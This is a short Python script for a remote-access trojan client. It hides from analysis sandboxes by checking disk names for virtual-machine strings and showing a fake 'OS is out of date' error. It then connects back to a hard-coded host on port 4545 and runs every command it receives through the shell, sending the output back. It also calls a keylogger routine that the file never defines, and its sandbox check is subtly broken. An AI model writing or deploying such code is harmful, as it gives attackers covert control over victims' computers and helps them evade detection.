import socket
import os
import subprocess
import time
import tkinter
from tkinter import messagebox



def SandBox(): 
    commandOutput= subprocess.check_output("wmic diskdrive get model",shell=True)
    commandOutput = commandOutput.decode()
    if ("WMware" or "VBOX") in commandOutput:
        root = tkinter.Tk()
        root.withdraw()
        messagebox.showerror("Error", "OS is out of date")
        exit()

class Client:
   
    def connect(self):
        self.client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.client.connect(("192.168.1.38",4545))
    def recv(self):
        while True:            
            self.data = self.client.recv(1024)
            self.encoded_data = self.data.decode()     
            if self.encoded_data == "Hey Client!":
                pass
            elif self.encoded_data == "start":
                self.keylogger(self.encoded_data)
            elif self.encoded_data[:2]=="cd":
                os.chdir(self.encoded_data[3:])
                self.client.send(os.getcwd().encode())
            else:
                self.commandOutput= subprocess.check_output(self.encoded_data,shell=True)
                self.client.send(self.commandOutput)


SandBox()
_client = Client()
while True:
    try:
        _client.connect()
        _client.recv()
    except:
        time.sleep(10)
